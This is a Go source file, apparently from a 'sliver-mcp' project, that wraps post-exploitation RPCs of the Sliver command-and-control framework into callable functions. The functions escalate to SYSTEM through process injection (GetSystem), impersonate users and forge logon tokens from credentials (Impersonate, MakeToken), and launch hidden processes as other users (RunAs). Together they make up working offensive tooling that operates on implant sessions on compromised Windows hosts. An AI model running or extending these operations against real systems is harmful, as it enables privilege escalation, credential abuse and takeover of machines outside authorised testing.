package sliver_cmd

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	c "github.com/xsxz/sliver-mcp/sliver/client"
)

var logonTypes = map[string]uint32{
	"LOGON_INTERACTIVE":       2,
	"LOGON_NETWORK":           3,
	"LOGON_BATCH":             4,
	"LOGON_SERVICE":           5,
	"LOGON_UNLOCK":            7,
	"LOGON_NETWORK_CLEARTEXT": 8,
	"LOGON_NEW_CREDENTIALS":   9,
}

func GetPrivs(client *c.SliverClient, session *clientpb.Session) (interface{}, error) {
	resp, err := client.RPC.GetPrivs(context.Background(), &sliverpb.GetPrivsReq{
		Request: client.MakeSessionRequest(session),
	})
	if err != nil {
		return nil, err
	}

	return resp, nil
}

func GetSystem(client *c.SliverClient, session *clientpb.Session, processNameInjectTo string) (interface{}, error) {
	err := checkIfOsIsWin(client, session)
	if err != nil {
		return nil, err
	}

	config, err := GetSessionImplantConfig(client, session.ID)
	if err != nil {
		return nil, err
	}

	_, err = client.RPC.GetSystem(context.Background(), &clientpb.GetSystemReq{
		Request:        client.MakeSessionRequest(session),
		Config:         config,
		HostingProcess: processNameInjectTo,
	})
	if err != nil {
		return nil, err
	}

	return ("A new NT AUTHORITY\\SYSTEM session should pop soon..."), nil
}

func Impersonate(client *c.SliverClient, session *clientpb.Session, username string) (interface{}, error) {
	resp, err := client.RPC.Impersonate(context.Background(), &sliverpb.ImpersonateReq{
		Username: username,
		Request:  client.MakeSessionRequest(session),
	})
	if err != nil {
		return nil, err
	}

	fmt.Println(resp.Response)

	return resp, nil
}

func MakeToken(client *c.SliverClient, session *clientpb.Session, username string, password string, domain string, logonType string) (interface{}, error) {
	logonTypeVal, ok := logonTypes[logonType]
	if !ok {
		keys := make([]string, 0, len(logonTypes))
		for k := range logonTypes {
			keys = append(keys, k)
		}
		return nil, fmt.Errorf("invalid logon type: %s. Available types: %v", logonType, keys)
	}

	_, err := client.RPC.MakeToken(context.Background(), &sliverpb.MakeTokenReq{
		Username:  username,
		Password:  password,
		Domain:    domain,
		LogonType: logonTypeVal,
		Request:   client.MakeSessionRequest(session),
	})
	if err != nil {
		return nil, err
	}

	return fmt.Sprintf("Successfully impersonated %s\\%s. Use `rev2self` to revert to your previous token.", domain, username), nil
}

func Rev2Self(client *c.SliverClient, session *clientpb.Session) (interface{}, error) {
	_, err := client.RPC.RevToSelf(context.Background(), &sliverpb.RevToSelfReq{
		Request: client.MakeSessionRequest(session),
	})
	if err != nil {
		return nil, err
	}

	return ("Dropping all impersonated tokens..."), nil
}

func RunAs(client *c.SliverClient, session *clientpb.Session, username string, password string, domain string, processname string, args string, netOnly bool, hideWindow bool) (interface{}, error) {
	resp, err := client.RPC.RunAs(context.Background(), &sliverpb.RunAsReq{
		Username:    username,
		Password:    password,
		Domain:      domain,
		ProcessName: processname,
		Args:        args,
		NetOnly:     netOnly,
		HideWindow:  hideWindow,
		Request:     client.MakeSessionRequest(session),
	})
	if err != nil {
		return nil, err
	}

	return resp, nil
}
